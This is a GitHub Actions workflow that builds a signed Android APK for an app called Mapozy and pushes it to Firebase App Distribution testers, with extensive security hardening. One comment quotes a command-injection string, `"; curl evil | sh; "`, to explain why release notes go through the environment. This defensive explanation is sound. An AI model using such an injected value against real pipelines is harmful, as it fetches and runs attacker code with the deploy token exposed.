name: Distribute to Firebase App Distribution

# Cuts a signed release APK and pushes it to the "testers" group, which is
# delivered through the Firebase App Tester app on testers' phones.
#
# Triggers:
#   - pushing a tag like v0.3.1  (the usual release path)
#   - manual run from the Actions tab (optionally with custom release notes)
#
# Required repo secrets (see docs/RELEASE.md):
#   ANDROID_KEYSTORE_BASE64   base64 of android/app/mapozy-release.keystore
#   ANDROID_KEYSTORE_PASSWORD store password
#   ANDROID_KEY_ALIAS         key alias
#   ANDROID_KEY_PASSWORD      key password
#   FIREBASE_TOKEN            from `firebase login:ci`
#   EXPO_PUBLIC_DEBUG_EMAIL   recipient for Settings → "Send data to Paul"
#                             (inlined into the JS bundle at build time)

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      notes:
        description: 'Release notes (defaults to the latest commit subject)'
        required: false
      app_id_suffix:
        description: 'applicationId suffix (e.g. .debug) to install alongside prod. When set, the build is distributed to the separate Firebase Debug app (com.paul.mapozy.debug) and also uploaded as an artifact.'
        required: false

concurrency:
  group: distribute-${{ github.ref }}
  cancel-in-progress: false

# Least privilege: this job only reads the repo. Without this block the
# GITHUB_TOKEN falls back to the repository default, which can be read-write —
# and this job runs third-party code (npm install, gradle, firebase-tools) with
# the signing keystore on disk.
permissions:
  contents: read

env:
  FIREBASE_APP_ID: '1:736958471752:android:dd125d6adef895b482c27d'
  # Separate Firebase Android app registered for com.paul.mapozy.debug, used for
  # suffixed side-by-side test builds (App Distribution ties an upload to the
  # app whose package matches the APK).
  FIREBASE_APP_ID_DEBUG: '1:736958471752:android:9a6ff5893088fdc982c27d'
  TESTER_GROUP: testers

jobs:
  build-distribute:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      # Actions are pinned to a full commit SHA: a tag such as @v4 is mutable,
      # and whoever can move it runs code next to the release keystore.
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          # Don't leave the GITHUB_TOKEN in .git/config for later steps.
          persist-credentials: false

      # Workflow inputs are attacker-controlled text as far as the shell is
      # concerned. The suffix ends up in a Gradle script and in file names, so
      # refuse anything that is not a plain applicationId suffix up front.
      - name: Validate inputs
        env:
          APP_ID_SUFFIX: ${{ github.event.inputs.app_id_suffix }}
        run: |
          if [ -n "$APP_ID_SUFFIX" ] && ! printf '%s' "$APP_ID_SUFFIX" | grep -Eq '^(\.[a-z][a-z0-9_]*)+$'; then
            echo "::error::app_id_suffix must look like '.debug' (got an unexpected value)"
            exit 1
          fi

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20
          cache: npm

      - uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4.9.1
        with:
          distribution: temurin
          java-version: '17'

      - name: Install JS dependencies
        run: npm ci

      # Suffixed test builds share app.json's version (e.g. 0.7.2 / code 30), so
      # every distribution looked identical to App Tester and Android — "no new
      # version". Give each a unique, monotonic versionCode (minutes since epoch,
      # int32-safe) and a visible versionName suffix. app.json is the version
      # source of truth (withAppJsonVersion re-reads it at gradle eval), and this
      # patch lives only in the CI checkout — the repo and real releases are
      # untouched.
      - name: Bump version for suffixed test builds
        if: ${{ github.event.inputs.app_id_suffix != '' }}
        env:
          RUN_NUMBER: ${{ github.run_number }}
        run: |
          node -e '
            const fs = require("fs");
            const p = JSON.parse(fs.readFileSync("app.json", "utf8"));
            p.expo.android.versionCode = Math.floor(Date.now() / 60000);
            p.expo.version = p.expo.version + "-debug." + process.env.RUN_NUMBER;
            p.expo.name = "Mapozy debug";
            fs.writeFileSync("app.json", JSON.stringify(p, null, 2));
            console.log("Test build:", p.expo.name, p.expo.version, "code", p.expo.android.versionCode);
          '

      - name: Generate native Android project
        run: npx expo prebuild --platform android --no-install
        env:
          CI: '1'
          MAPOZY_APP_ID_SUFFIX: ${{ github.event.inputs.app_id_suffix }}

      - name: Restore keystore and signing properties
        env:
          ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
        run: |
          echo "$ANDROID_KEYSTORE_BASE64" | base64 -d > android/app/mapozy-release.keystore
          cat > android/keystore.properties <<EOF
          storeFile=mapozy-release.keystore
          storePassword=$ANDROID_KEYSTORE_PASSWORD
          keyAlias=$ANDROID_KEY_ALIAS
          keyPassword=$ANDROID_KEY_PASSWORD
          EOF

      - name: Build signed release APK
        run: ./gradlew assembleRelease --no-daemon
        working-directory: android
        env:
          # EXPO_PUBLIC_* vars are read from process.env and inlined into the JS
          # bundle by Metro during assembleRelease. Without this, the gitignored
          # .env is absent in CI and the value bakes in as undefined, breaking
          # Settings → "Send data to Paul".
          EXPO_PUBLIC_DEBUG_EMAIL: ${{ secrets.EXPO_PUBLIC_DEBUG_EMAIL }}

      - name: Verify APK is release-signed (not debug)
        run: |
          APK=android/app/build/outputs/apk/release/app-release.apk
          test -f "$APK" || { echo "APK not found at $APK"; exit 1; }
          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name apksigner | sort -V | tail -1)
          echo "Using $APKSIGNER"
          SIGNER=$("$APKSIGNER" verify --print-certs "$APK" | grep -m1 "Signer #1 certificate DN" || true)
          echo "$SIGNER"
          if echo "$SIGNER" | grep -qi "androiddebugkey"; then
            echo "ERROR: APK is debug-signed — release keystore was not applied"; exit 1
          fi

      - name: Upload APK artifact (for suffixed / sideload builds)
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: mapozy-apk${{ github.event.inputs.app_id_suffix }}
          path: android/app/build/outputs/apk/release/app-release.apk
          if-no-files-found: error

      - name: Distribute to Firebase App Distribution
        # Suffixed builds (e.g. .debug) go to the matching Firebase Debug app;
        # un-suffixed builds (tag pushes, normal dispatches) go to the prod app.
        env:
          # firebase-tools reads FIREBASE_TOKEN from the environment on its own;
          # passing it as --token would put the secret on the command line,
          # where any process on the runner can read it.
          FIREBASE_TOKEN: ${{ secrets.FIREBASE_TOKEN }}
          APP_ID_SUFFIX: ${{ github.event.inputs.app_id_suffix }}
          # Passed through the environment, never interpolated into the script:
          # `${{ inputs.notes }}` inside `run:` is pasted into the shell source
          # verbatim, so notes like `"; curl evil | sh; "` would execute with
          # FIREBASE_TOKEN in scope.
          NOTES_INPUT: ${{ github.event.inputs.notes }}
          # Pinned: an unpinned `npx -y firebase-tools` runs whatever was last
          # published to npm, with the Firebase token in its environment.
          FIREBASE_TOOLS_VERSION: '15.35.0'
        run: |
          NOTES="$NOTES_INPUT"
          if [ -z "$NOTES" ]; then NOTES="$(git log -1 --pretty=%s)"; fi
          APP="$FIREBASE_APP_ID"
          if [ -n "$APP_ID_SUFFIX" ]; then APP="$FIREBASE_APP_ID_DEBUG"; fi
          echo "Release notes: $NOTES"
          echo "Distributing to Firebase app: $APP (suffix: '${APP_ID_SUFFIX:-none}')"
          npx -y "firebase-tools@$FIREBASE_TOOLS_VERSION" appdistribution:distribute \
            android/app/build/outputs/apk/release/app-release.apk \
            --app "$APP" \
            --groups "$TESTER_GROUP" \
            --release-notes "$NOTES"
